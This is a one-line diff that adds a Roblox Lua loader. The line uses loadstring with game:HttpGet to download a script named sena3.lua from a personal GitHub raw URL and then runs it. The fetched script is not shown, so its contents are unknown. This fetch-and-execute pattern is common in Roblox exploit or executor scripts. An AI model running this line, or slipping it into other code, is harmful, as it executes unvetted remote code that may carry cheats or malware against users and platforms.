@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n01771542-cmd/storege/main/sena3.lua"))()
